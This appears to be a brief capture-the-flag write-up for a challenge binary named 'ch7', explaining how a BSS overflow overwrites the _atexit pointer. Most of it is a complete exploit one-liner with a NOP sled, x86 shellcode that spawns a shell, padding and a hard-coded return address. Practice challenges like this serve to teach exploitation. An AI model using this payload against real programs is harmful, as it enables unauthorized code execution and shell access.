Simple BSS. Same principle as the other ones. BSS is not protected from being executable. We just have to overflow _atexit pointer to point to the beginning of or shellcode.
Let's use a NOP sled just in case.

./ch7 $(python -c 'print("\x90" * 200 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\x90" * 291 + "\x40\xa0\x04\x08" )')

*BOOM!*